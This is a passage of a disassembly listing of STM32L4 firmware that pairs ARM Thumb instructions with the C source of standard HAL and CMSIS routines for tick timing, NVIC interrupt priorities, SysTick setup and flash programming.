 8001146:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 8001148:	7bfb      	ldrb	r3, [r7, #15]
}
 800114a:	4618      	mov	r0, r3
 800114c:	3710      	adds	r7, #16
 800114e:	46bd      	mov	sp, r7
 8001150:	bd80      	pop	{r7, pc}
 8001152:	bf00      	nop
 8001154:	20000008 	.word	0x20000008
 8001158:	20000000 	.word	0x20000000
 800115c:	20000004 	.word	0x20000004

08001160 <HAL_IncTick>:
 * @note This function is declared as __weak to be overwritten in case of other
  *      implementations in user file.
  * @retval None
  */
__weak void HAL_IncTick(void)
{
 8001160:	b480      	push	{r7}
 8001162:	af00      	add	r7, sp, #0
  uwTick += (uint32_t)uwTickFreq;
 8001164:	4b06      	ldr	r3, [pc, #24]	; (8001180 <HAL_IncTick+0x20>)
 8001166:	781b      	ldrb	r3, [r3, #0]
 8001168:	461a      	mov	r2, r3
 800116a:	4b06      	ldr	r3, [pc, #24]	; (8001184 <HAL_IncTick+0x24>)
 800116c:	681b      	ldr	r3, [r3, #0]
 800116e:	4413      	add	r3, r2
 8001170:	4a04      	ldr	r2, [pc, #16]	; (8001184 <HAL_IncTick+0x24>)
 8001172:	6013      	str	r3, [r2, #0]
}
 8001174:	bf00      	nop
 8001176:	46bd      	mov	sp, r7
 8001178:	f85d 7b04 	ldr.w	r7, [sp], #4
 800117c:	4770      	bx	lr
 800117e:	bf00      	nop
 8001180:	20000008 	.word	0x20000008
 8001184:	200003b8 	.word	0x200003b8

08001188 <HAL_GetTick>:
  * @note This function is declared as __weak to be overwritten in case of other
  *       implementations in user file.
  * @retval tick value
  */
__weak uint32_t HAL_GetTick(void)
{
 8001188:	b480      	push	{r7}
 800118a:	af00      	add	r7, sp, #0
  return uwTick;
 800118c:	4b03      	ldr	r3, [pc, #12]	; (800119c <HAL_GetTick+0x14>)
 800118e:	681b      	ldr	r3, [r3, #0]
}
 8001190:	4618      	mov	r0, r3
 8001192:	46bd      	mov	sp, r7
 8001194:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001198:	4770      	bx	lr
 800119a:	bf00      	nop
 800119c:	200003b8 	.word	0x200003b8

080011a0 <HAL_Delay>:
  *       implementations in user file.
  * @param Delay  specifies the delay time length, in milliseconds.
  * @retval None
  */
__weak void HAL_Delay(uint32_t Delay)
{
 80011a0:	b580      	push	{r7, lr}
 80011a2:	b084      	sub	sp, #16
 80011a4:	af00      	add	r7, sp, #0
 80011a6:	6078      	str	r0, [r7, #4]
  uint32_t tickstart = HAL_GetTick();
 80011a8:	f7ff ffee 	bl	8001188 <HAL_GetTick>
 80011ac:	60b8      	str	r0, [r7, #8]
  uint32_t wait = Delay;
 80011ae:	687b      	ldr	r3, [r7, #4]
 80011b0:	60fb      	str	r3, [r7, #12]

  /* Add a period to guaranty minimum wait */
  if (wait < HAL_MAX_DELAY)
 80011b2:	68fb      	ldr	r3, [r7, #12]
 80011b4:	f1b3 3fff 	cmp.w	r3, #4294967295
 80011b8:	d005      	beq.n	80011c6 <HAL_Delay+0x26>
  {
    wait += (uint32_t)uwTickFreq;
 80011ba:	4b0a      	ldr	r3, [pc, #40]	; (80011e4 <HAL_Delay+0x44>)
 80011bc:	781b      	ldrb	r3, [r3, #0]
 80011be:	461a      	mov	r2, r3
 80011c0:	68fb      	ldr	r3, [r7, #12]
 80011c2:	4413      	add	r3, r2
 80011c4:	60fb      	str	r3, [r7, #12]
  }

  while ((HAL_GetTick() - tickstart) < wait)
 80011c6:	bf00      	nop
 80011c8:	f7ff ffde 	bl	8001188 <HAL_GetTick>
 80011cc:	4602      	mov	r2, r0
 80011ce:	68bb      	ldr	r3, [r7, #8]
 80011d0:	1ad3      	subs	r3, r2, r3
 80011d2:	68fa      	ldr	r2, [r7, #12]
 80011d4:	429a      	cmp	r2, r3
 80011d6:	d8f7      	bhi.n	80011c8 <HAL_Delay+0x28>
  {
  }
}
 80011d8:	bf00      	nop
 80011da:	bf00      	nop
 80011dc:	3710      	adds	r7, #16
 80011de:	46bd      	mov	sp, r7
 80011e0:	bd80      	pop	{r7, pc}
 80011e2:	bf00      	nop
 80011e4:	20000008 	.word	0x20000008

080011e8 <__NVIC_SetPriorityGrouping>:
           In case of a conflict between priority grouping and available
           priority bits (__NVIC_PRIO_BITS), the smallest possible priority group is set.
  \param [in]      PriorityGroup  Priority grouping field.
 */
__STATIC_INLINE void __NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 80011e8:	b480      	push	{r7}
 80011ea:	b085      	sub	sp, #20
 80011ec:	af00      	add	r7, sp, #0
 80011ee:	6078      	str	r0, [r7, #4]
  uint32_t reg_value;
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);             /* only values 0..7 are used          */
 80011f0:	687b      	ldr	r3, [r7, #4]
 80011f2:	f003 0307 	and.w	r3, r3, #7
 80011f6:	60fb      	str	r3, [r7, #12]

  reg_value  =  SCB->AIRCR;                                                   /* read old register configuration    */
 80011f8:	4b0c      	ldr	r3, [pc, #48]	; (800122c <__NVIC_SetPriorityGrouping+0x44>)
 80011fa:	68db      	ldr	r3, [r3, #12]
 80011fc:	60bb      	str	r3, [r7, #8]
  reg_value &= ~((uint32_t)(SCB_AIRCR_VECTKEY_Msk | SCB_AIRCR_PRIGROUP_Msk)); /* clear bits to change               */
 80011fe:	68ba      	ldr	r2, [r7, #8]
 8001200:	f64f 03ff 	movw	r3, #63743	; 0xf8ff
 8001204:	4013      	ands	r3, r2
 8001206:	60bb      	str	r3, [r7, #8]
  reg_value  =  (reg_value                                   |
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
                (PriorityGroupTmp << SCB_AIRCR_PRIGROUP_Pos)  );              /* Insert write key and priority group */
 8001208:	68fb      	ldr	r3, [r7, #12]
 800120a:	021a      	lsls	r2, r3, #8
                ((uint32_t)0x5FAUL << SCB_AIRCR_VECTKEY_Pos) |
 800120c:	68bb      	ldr	r3, [r7, #8]
 800120e:	4313      	orrs	r3, r2
  reg_value  =  (reg_value                                   |
 8001210:	f043 63bf 	orr.w	r3, r3, #100139008	; 0x5f80000
 8001214:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001218:	60bb      	str	r3, [r7, #8]
  SCB->AIRCR =  reg_value;
 800121a:	4a04      	ldr	r2, [pc, #16]	; (800122c <__NVIC_SetPriorityGrouping+0x44>)
 800121c:	68bb      	ldr	r3, [r7, #8]
 800121e:	60d3      	str	r3, [r2, #12]
}
 8001220:	bf00      	nop
 8001222:	3714      	adds	r7, #20
 8001224:	46bd      	mov	sp, r7
 8001226:	f85d 7b04 	ldr.w	r7, [sp], #4
 800122a:	4770      	bx	lr
 800122c:	e000ed00 	.word	0xe000ed00

08001230 <__NVIC_GetPriorityGrouping>:
  \brief   Get Priority Grouping
  \details Reads the priority grouping field from the NVIC Interrupt Controller.
  \return                Priority grouping field (SCB->AIRCR [10:8] PRIGROUP field).
 */
__STATIC_INLINE uint32_t __NVIC_GetPriorityGrouping(void)
{
 8001230:	b480      	push	{r7}
 8001232:	af00      	add	r7, sp, #0
  return ((uint32_t)((SCB->AIRCR & SCB_AIRCR_PRIGROUP_Msk) >> SCB_AIRCR_PRIGROUP_Pos));
 8001234:	4b04      	ldr	r3, [pc, #16]	; (8001248 <__NVIC_GetPriorityGrouping+0x18>)
 8001236:	68db      	ldr	r3, [r3, #12]
 8001238:	0a1b      	lsrs	r3, r3, #8
 800123a:	f003 0307 	and.w	r3, r3, #7
}
 800123e:	4618      	mov	r0, r3
 8001240:	46bd      	mov	sp, r7
 8001242:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001246:	4770      	bx	lr
 8001248:	e000ed00 	.word	0xe000ed00

0800124c <__NVIC_EnableIRQ>:
  \details Enables a device specific interrupt in the NVIC interrupt controller.
  \param [in]      IRQn  Device specific interrupt number.
  \note    IRQn must not be negative.
 */
__STATIC_INLINE void __NVIC_EnableIRQ(IRQn_Type IRQn)
{
 800124c:	b480      	push	{r7}
 800124e:	b083      	sub	sp, #12
 8001250:	af00      	add	r7, sp, #0
 8001252:	4603      	mov	r3, r0
 8001254:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001256:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800125a:	2b00      	cmp	r3, #0
 800125c:	db0b      	blt.n	8001276 <__NVIC_EnableIRQ+0x2a>
  {
    __COMPILER_BARRIER();
    NVIC->ISER[(((uint32_t)IRQn) >> 5UL)] = (uint32_t)(1UL << (((uint32_t)IRQn) & 0x1FUL));
 800125e:	79fb      	ldrb	r3, [r7, #7]
 8001260:	f003 021f 	and.w	r2, r3, #31
 8001264:	4907      	ldr	r1, [pc, #28]	; (8001284 <__NVIC_EnableIRQ+0x38>)
 8001266:	f997 3007 	ldrsb.w	r3, [r7, #7]
 800126a:	095b      	lsrs	r3, r3, #5
 800126c:	2001      	movs	r0, #1
 800126e:	fa00 f202 	lsl.w	r2, r0, r2
 8001272:	f841 2023 	str.w	r2, [r1, r3, lsl #2]
    __COMPILER_BARRIER();
  }
}
 8001276:	bf00      	nop
 8001278:	370c      	adds	r7, #12
 800127a:	46bd      	mov	sp, r7
 800127c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001280:	4770      	bx	lr
 8001282:	bf00      	nop
 8001284:	e000e100 	.word	0xe000e100

08001288 <__NVIC_SetPriority>:
  \param [in]      IRQn  Interrupt number.
  \param [in]  priority  Priority to set.
  \note    The priority cannot be set for every processor exception.
 */
__STATIC_INLINE void __NVIC_SetPriority(IRQn_Type IRQn, uint32_t priority)
{
 8001288:	b480      	push	{r7}
 800128a:	b083      	sub	sp, #12
 800128c:	af00      	add	r7, sp, #0
 800128e:	4603      	mov	r3, r0
 8001290:	6039      	str	r1, [r7, #0]
 8001292:	71fb      	strb	r3, [r7, #7]
  if ((int32_t)(IRQn) >= 0)
 8001294:	f997 3007 	ldrsb.w	r3, [r7, #7]
 8001298:	2b00      	cmp	r3, #0
 800129a:	db0a      	blt.n	80012b2 <__NVIC_SetPriority+0x2a>
  {
    NVIC->IP[((uint32_t)IRQn)]               = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 800129c:	683b      	ldr	r3, [r7, #0]
 800129e:	b2da      	uxtb	r2, r3
 80012a0:	490c      	ldr	r1, [pc, #48]	; (80012d4 <__NVIC_SetPriority+0x4c>)
 80012a2:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80012a6:	0112      	lsls	r2, r2, #4
 80012a8:	b2d2      	uxtb	r2, r2
 80012aa:	440b      	add	r3, r1
 80012ac:	f883 2300 	strb.w	r2, [r3, #768]	; 0x300
  }
  else
  {
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
  }
}
 80012b0:	e00a      	b.n	80012c8 <__NVIC_SetPriority+0x40>
    SCB->SHP[(((uint32_t)IRQn) & 0xFUL)-4UL] = (uint8_t)((priority << (8U - __NVIC_PRIO_BITS)) & (uint32_t)0xFFUL);
 80012b2:	683b      	ldr	r3, [r7, #0]
 80012b4:	b2da      	uxtb	r2, r3
 80012b6:	4908      	ldr	r1, [pc, #32]	; (80012d8 <__NVIC_SetPriority+0x50>)
 80012b8:	79fb      	ldrb	r3, [r7, #7]
 80012ba:	f003 030f 	and.w	r3, r3, #15
 80012be:	3b04      	subs	r3, #4
 80012c0:	0112      	lsls	r2, r2, #4
 80012c2:	b2d2      	uxtb	r2, r2
 80012c4:	440b      	add	r3, r1
 80012c6:	761a      	strb	r2, [r3, #24]
}
 80012c8:	bf00      	nop
 80012ca:	370c      	adds	r7, #12
 80012cc:	46bd      	mov	sp, r7
 80012ce:	f85d 7b04 	ldr.w	r7, [sp], #4
 80012d2:	4770      	bx	lr
 80012d4:	e000e100 	.word	0xe000e100
 80012d8:	e000ed00 	.word	0xe000ed00

080012dc <NVIC_EncodePriority>:
  \param [in]   PreemptPriority  Preemptive priority value (starting from 0).
  \param [in]       SubPriority  Subpriority value (starting from 0).
  \return                        Encoded priority. Value can be used in the function \ref NVIC_SetPriority().
 */
__STATIC_INLINE uint32_t NVIC_EncodePriority (uint32_t PriorityGroup, uint32_t PreemptPriority, uint32_t SubPriority)
{
 80012dc:	b480      	push	{r7}
 80012de:	b089      	sub	sp, #36	; 0x24
 80012e0:	af00      	add	r7, sp, #0
 80012e2:	60f8      	str	r0, [r7, #12]
 80012e4:	60b9      	str	r1, [r7, #8]
 80012e6:	607a      	str	r2, [r7, #4]
  uint32_t PriorityGroupTmp = (PriorityGroup & (uint32_t)0x07UL);   /* only values 0..7 are used          */
 80012e8:	68fb      	ldr	r3, [r7, #12]
 80012ea:	f003 0307 	and.w	r3, r3, #7
 80012ee:	61fb      	str	r3, [r7, #28]
  uint32_t PreemptPriorityBits;
  uint32_t SubPriorityBits;

  PreemptPriorityBits = ((7UL - PriorityGroupTmp) > (uint32_t)(__NVIC_PRIO_BITS)) ? (uint32_t)(__NVIC_PRIO_BITS) : (uint32_t)(7UL - PriorityGroupTmp);
 80012f0:	69fb      	ldr	r3, [r7, #28]
 80012f2:	f1c3 0307 	rsb	r3, r3, #7
 80012f6:	2b04      	cmp	r3, #4
 80012f8:	bf28      	it	cs
 80012fa:	2304      	movcs	r3, #4
 80012fc:	61bb      	str	r3, [r7, #24]
  SubPriorityBits     = ((PriorityGroupTmp + (uint32_t)(__NVIC_PRIO_BITS)) < (uint32_t)7UL) ? (uint32_t)0UL : (uint32_t)((PriorityGroupTmp - 7UL) + (uint32_t)(__NVIC_PRIO_BITS));
 80012fe:	69fb      	ldr	r3, [r7, #28]
 8001300:	3304      	adds	r3, #4
 8001302:	2b06      	cmp	r3, #6
 8001304:	d902      	bls.n	800130c <NVIC_EncodePriority+0x30>
 8001306:	69fb      	ldr	r3, [r7, #28]
 8001308:	3b03      	subs	r3, #3
 800130a:	e000      	b.n	800130e <NVIC_EncodePriority+0x32>
 800130c:	2300      	movs	r3, #0
 800130e:	617b      	str	r3, [r7, #20]

  return (
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001310:	f04f 32ff 	mov.w	r2, #4294967295
 8001314:	69bb      	ldr	r3, [r7, #24]
 8001316:	fa02 f303 	lsl.w	r3, r2, r3
 800131a:	43da      	mvns	r2, r3
 800131c:	68bb      	ldr	r3, [r7, #8]
 800131e:	401a      	ands	r2, r3
 8001320:	697b      	ldr	r3, [r7, #20]
 8001322:	409a      	lsls	r2, r3
           ((SubPriority     & (uint32_t)((1UL << (SubPriorityBits    )) - 1UL)))
 8001324:	f04f 31ff 	mov.w	r1, #4294967295
 8001328:	697b      	ldr	r3, [r7, #20]
 800132a:	fa01 f303 	lsl.w	r3, r1, r3
 800132e:	43d9      	mvns	r1, r3
 8001330:	687b      	ldr	r3, [r7, #4]
 8001332:	400b      	ands	r3, r1
           ((PreemptPriority & (uint32_t)((1UL << (PreemptPriorityBits)) - 1UL)) << SubPriorityBits) |
 8001334:	4313      	orrs	r3, r2
         );
}
 8001336:	4618      	mov	r0, r3
 8001338:	3724      	adds	r7, #36	; 0x24
 800133a:	46bd      	mov	sp, r7
 800133c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001340:	4770      	bx	lr
	...

08001344 <SysTick_Config>:
  \note    When the variable <b>__Vendor_SysTickConfig</b> is set to 1, then the
           function <b>SysTick_Config</b> is not included. In this case, the file <b><i>device</i>.h</b>
           must contain a vendor-specific implementation of this function.
 */
__STATIC_INLINE uint32_t SysTick_Config(uint32_t ticks)
{
 8001344:	b580      	push	{r7, lr}
 8001346:	b082      	sub	sp, #8
 8001348:	af00      	add	r7, sp, #0
 800134a:	6078      	str	r0, [r7, #4]
  if ((ticks - 1UL) > SysTick_LOAD_RELOAD_Msk)
 800134c:	687b      	ldr	r3, [r7, #4]
 800134e:	3b01      	subs	r3, #1
 8001350:	f1b3 7f80 	cmp.w	r3, #16777216	; 0x1000000
 8001354:	d301      	bcc.n	800135a <SysTick_Config+0x16>
  {
    return (1UL);                                                   /* Reload value impossible */
 8001356:	2301      	movs	r3, #1
 8001358:	e00f      	b.n	800137a <SysTick_Config+0x36>
  }

  SysTick->LOAD  = (uint32_t)(ticks - 1UL);                         /* set reload register */
 800135a:	4a0a      	ldr	r2, [pc, #40]	; (8001384 <SysTick_Config+0x40>)
 800135c:	687b      	ldr	r3, [r7, #4]
 800135e:	3b01      	subs	r3, #1
 8001360:	6053      	str	r3, [r2, #4]
  NVIC_SetPriority (SysTick_IRQn, (1UL << __NVIC_PRIO_BITS) - 1UL); /* set Priority for Systick Interrupt */
 8001362:	210f      	movs	r1, #15
 8001364:	f04f 30ff 	mov.w	r0, #4294967295
 8001368:	f7ff ff8e 	bl	8001288 <__NVIC_SetPriority>
  SysTick->VAL   = 0UL;                                             /* Load the SysTick Counter Value */
 800136c:	4b05      	ldr	r3, [pc, #20]	; (8001384 <SysTick_Config+0x40>)
 800136e:	2200      	movs	r2, #0
 8001370:	609a      	str	r2, [r3, #8]
  SysTick->CTRL  = SysTick_CTRL_CLKSOURCE_Msk |
 8001372:	4b04      	ldr	r3, [pc, #16]	; (8001384 <SysTick_Config+0x40>)
 8001374:	2207      	movs	r2, #7
 8001376:	601a      	str	r2, [r3, #0]
                   SysTick_CTRL_TICKINT_Msk   |
                   SysTick_CTRL_ENABLE_Msk;                         /* Enable SysTick IRQ and SysTick Timer */
  return (0UL);                                                     /* Function successful */
 8001378:	2300      	movs	r3, #0
}
 800137a:	4618      	mov	r0, r3
 800137c:	3708      	adds	r7, #8
 800137e:	46bd      	mov	sp, r7
 8001380:	bd80      	pop	{r7, pc}
 8001382:	bf00      	nop
 8001384:	e000e010 	.word	0xe000e010

08001388 <HAL_NVIC_SetPriorityGrouping>:
  * @note   When the NVIC_PriorityGroup_0 is selected, IRQ pre-emption is no more possible.
  *         The pending IRQ priority will be managed only by the subpriority.
  * @retval None
  */
void HAL_NVIC_SetPriorityGrouping(uint32_t PriorityGroup)
{
 8001388:	b580      	push	{r7, lr}
 800138a:	b082      	sub	sp, #8
 800138c:	af00      	add	r7, sp, #0
 800138e:	6078      	str	r0, [r7, #4]
  /* Check the parameters */
  assert_param(IS_NVIC_PRIORITY_GROUP(PriorityGroup));

  /* Set the PRIGROUP[10:8] bits according to the PriorityGroup parameter value */
  NVIC_SetPriorityGrouping(PriorityGroup);
 8001390:	6878      	ldr	r0, [r7, #4]
 8001392:	f7ff ff29 	bl	80011e8 <__NVIC_SetPriorityGrouping>
}
 8001396:	bf00      	nop
 8001398:	3708      	adds	r7, #8
 800139a:	46bd      	mov	sp, r7
 800139c:	bd80      	pop	{r7, pc}

0800139e <HAL_NVIC_SetPriority>:
  *         This parameter can be a value between 0 and 15
  *         A lower priority value indicates a higher priority.
  * @retval None
  */
void HAL_NVIC_SetPriority(IRQn_Type IRQn, uint32_t PreemptPriority, uint32_t SubPriority)
{
 800139e:	b580      	push	{r7, lr}
 80013a0:	b086      	sub	sp, #24
 80013a2:	af00      	add	r7, sp, #0
 80013a4:	4603      	mov	r3, r0
 80013a6:	60b9      	str	r1, [r7, #8]
 80013a8:	607a      	str	r2, [r7, #4]
 80013aa:	73fb      	strb	r3, [r7, #15]
  uint32_t prioritygroup = 0x00;
 80013ac:	2300      	movs	r3, #0
 80013ae:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_NVIC_SUB_PRIORITY(SubPriority));
  assert_param(IS_NVIC_PREEMPTION_PRIORITY(PreemptPriority));

  prioritygroup = NVIC_GetPriorityGrouping();
 80013b0:	f7ff ff3e 	bl	8001230 <__NVIC_GetPriorityGrouping>
 80013b4:	6178      	str	r0, [r7, #20]

  NVIC_SetPriority(IRQn, NVIC_EncodePriority(prioritygroup, PreemptPriority, SubPriority));
 80013b6:	687a      	ldr	r2, [r7, #4]
 80013b8:	68b9      	ldr	r1, [r7, #8]
 80013ba:	6978      	ldr	r0, [r7, #20]
 80013bc:	f7ff ff8e 	bl	80012dc <NVIC_EncodePriority>
 80013c0:	4602      	mov	r2, r0
 80013c2:	f997 300f 	ldrsb.w	r3, [r7, #15]
 80013c6:	4611      	mov	r1, r2
 80013c8:	4618      	mov	r0, r3
 80013ca:	f7ff ff5d 	bl	8001288 <__NVIC_SetPriority>
}
 80013ce:	bf00      	nop
 80013d0:	3718      	adds	r7, #24
 80013d2:	46bd      	mov	sp, r7
 80013d4:	bd80      	pop	{r7, pc}

080013d6 <HAL_NVIC_EnableIRQ>:
  *         This parameter can be an enumerator of IRQn_Type enumeration
  *         (For the complete STM32 Devices IRQ Channels list, please refer to the appropriate CMSIS device file (stm32l4xxxx.h))
  * @retval None
  */
void HAL_NVIC_EnableIRQ(IRQn_Type IRQn)
{
 80013d6:	b580      	push	{r7, lr}
 80013d8:	b082      	sub	sp, #8
 80013da:	af00      	add	r7, sp, #0
 80013dc:	4603      	mov	r3, r0
 80013de:	71fb      	strb	r3, [r7, #7]
  /* Check the parameters */
  assert_param(IS_NVIC_DEVICE_IRQ(IRQn));
  
  /* Enable interrupt */
  NVIC_EnableIRQ(IRQn);
 80013e0:	f997 3007 	ldrsb.w	r3, [r7, #7]
 80013e4:	4618      	mov	r0, r3
 80013e6:	f7ff ff31 	bl	800124c <__NVIC_EnableIRQ>
}
 80013ea:	bf00      	nop
 80013ec:	3708      	adds	r7, #8
 80013ee:	46bd      	mov	sp, r7
 80013f0:	bd80      	pop	{r7, pc}

080013f2 <HAL_SYSTICK_Config>:
  * @param  TicksNumb: Specifies the ticks Number of ticks between two interrupts.
  * @retval status:  - 0  Function succeeded.
  *                  - 1  Function failed.
  */
uint32_t HAL_SYSTICK_Config(uint32_t TicksNumb)
{
 80013f2:	b580      	push	{r7, lr}
 80013f4:	b082      	sub	sp, #8
 80013f6:	af00      	add	r7, sp, #0
 80013f8:	6078      	str	r0, [r7, #4]
   return SysTick_Config(TicksNumb);
 80013fa:	6878      	ldr	r0, [r7, #4]
 80013fc:	f7ff ffa2 	bl	8001344 <SysTick_Config>
 8001400:	4603      	mov	r3, r0
}
 8001402:	4618      	mov	r0, r3
 8001404:	3708      	adds	r7, #8
 8001406:	46bd      	mov	sp, r7
 8001408:	bd80      	pop	{r7, pc}
	...

0800140c <HAL_FLASH_Program>:
  *                are stored the data for the row fast program
  *
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Program(uint32_t TypeProgram, uint32_t Address, uint64_t Data)
{
 800140c:	b580      	push	{r7, lr}
 800140e:	b086      	sub	sp, #24
 8001410:	af00      	add	r7, sp, #0
 8001412:	60f8      	str	r0, [r7, #12]
 8001414:	60b9      	str	r1, [r7, #8]
 8001416:	e9c7 2300 	strd	r2, r3, [r7]
  HAL_StatusTypeDef status;
  uint32_t prog_bit = 0;
 800141a:	2300      	movs	r3, #0
 800141c:	613b      	str	r3, [r7, #16]

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800141e:	4b2f      	ldr	r3, [pc, #188]	; (80014dc <HAL_FLASH_Program+0xd0>)
 8001420:	781b      	ldrb	r3, [r3, #0]
 8001422:	2b01      	cmp	r3, #1
 8001424:	d101      	bne.n	800142a <HAL_FLASH_Program+0x1e>
 8001426:	2302      	movs	r3, #2
 8001428:	e053      	b.n	80014d2 <HAL_FLASH_Program+0xc6>
 800142a:	4b2c      	ldr	r3, [pc, #176]	; (80014dc <HAL_FLASH_Program+0xd0>)
 800142c:	2201      	movs	r2, #1
 800142e:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEPROGRAM(TypeProgram));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001430:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001434:	f000 f888 	bl	8001548 <FLASH_WaitForLastOperation>
 8001438:	4603      	mov	r3, r0
 800143a:	75fb      	strb	r3, [r7, #23]

  if(status == HAL_OK)
 800143c:	7dfb      	ldrb	r3, [r7, #23]
 800143e:	2b00      	cmp	r3, #0
 8001440:	d143      	bne.n	80014ca <HAL_FLASH_Program+0xbe>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 8001442:	4b26      	ldr	r3, [pc, #152]	; (80014dc <HAL_FLASH_Program+0xd0>)
 8001444:	2200      	movs	r2, #0
 8001446:	605a      	str	r2, [r3, #4]

    /* Deactivate the data cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001448:	4b25      	ldr	r3, [pc, #148]	; (80014e0 <HAL_FLASH_Program+0xd4>)
 800144a:	681b      	ldr	r3, [r3, #0]
 800144c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001450:	2b00      	cmp	r3, #0
 8001452:	d009      	beq.n	8001468 <HAL_FLASH_Program+0x5c>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 8001454:	4b22      	ldr	r3, [pc, #136]	; (80014e0 <HAL_FLASH_Program+0xd4>)
 8001456:	681b      	ldr	r3, [r3, #0]
 8001458:	4a21      	ldr	r2, [pc, #132]	; (80014e0 <HAL_FLASH_Program+0xd4>)
 800145a:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 800145e:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 8001460:	4b1e      	ldr	r3, [pc, #120]	; (80014dc <HAL_FLASH_Program+0xd0>)
 8001462:	2202      	movs	r2, #2
 8001464:	771a      	strb	r2, [r3, #28]
 8001466:	e002      	b.n	800146e <HAL_FLASH_Program+0x62>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001468:	4b1c      	ldr	r3, [pc, #112]	; (80014dc <HAL_FLASH_Program+0xd0>)
 800146a:	2200      	movs	r2, #0
 800146c:	771a      	strb	r2, [r3, #28]
    }

    if(TypeProgram == FLASH_TYPEPROGRAM_DOUBLEWORD)
 800146e:	68fb      	ldr	r3, [r7, #12]
 8001470:	2b00      	cmp	r3, #0
 8001472:	d107      	bne.n	8001484 <HAL_FLASH_Program+0x78>
    {
      /* Program double-word (64-bit) at a specified address */
      FLASH_Program_DoubleWord(Address, Data);
 8001474:	e9d7 2300 	ldrd	r2, r3, [r7]
 8001478:	68b8      	ldr	r0, [r7, #8]
 800147a:	f000 f8bd 	bl	80015f8 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 800147e:	2301      	movs	r3, #1
 8001480:	613b      	str	r3, [r7, #16]
 8001482:	e010      	b.n	80014a6 <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 8001484:	68fb      	ldr	r3, [r7, #12]
 8001486:	2b01      	cmp	r3, #1
 8001488:	d002      	beq.n	8001490 <HAL_FLASH_Program+0x84>
 800148a:	68fb      	ldr	r3, [r7, #12]
 800148c:	2b02      	cmp	r3, #2
 800148e:	d10a      	bne.n	80014a6 <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 8001490:	683b      	ldr	r3, [r7, #0]
 8001492:	4619      	mov	r1, r3
 8001494:	68b8      	ldr	r0, [r7, #8]
 8001496:	f000 f8d5 	bl	8001644 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 800149a:	68fb      	ldr	r3, [r7, #12]
 800149c:	2b02      	cmp	r3, #2
 800149e:	d102      	bne.n	80014a6 <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 80014a0:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 80014a4:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80014a6:	f24c 3050 	movw	r0, #50000	; 0xc350
 80014aa:	f000 f84d 	bl	8001548 <FLASH_WaitForLastOperation>
 80014ae:	4603      	mov	r3, r0
 80014b0:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 80014b2:	693b      	ldr	r3, [r7, #16]
 80014b4:	2b00      	cmp	r3, #0
 80014b6:	d006      	beq.n	80014c6 <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 80014b8:	4b09      	ldr	r3, [pc, #36]	; (80014e0 <HAL_FLASH_Program+0xd4>)
 80014ba:	695a      	ldr	r2, [r3, #20]
 80014bc:	693b      	ldr	r3, [r7, #16]
 80014be:	43db      	mvns	r3, r3
 80014c0:	4907      	ldr	r1, [pc, #28]	; (80014e0 <HAL_FLASH_Program+0xd4>)
 80014c2:	4013      	ands	r3, r2
 80014c4:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 80014c6:	f000 f9cf 	bl	8001868 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 80014ca:	4b04      	ldr	r3, [pc, #16]	; (80014dc <HAL_FLASH_Program+0xd0>)
 80014cc:	2200      	movs	r2, #0
 80014ce:	701a      	strb	r2, [r3, #0]

  return status;
 80014d0:	7dfb      	ldrb	r3, [r7, #23]
}
 80014d2:	4618      	mov	r0, r3
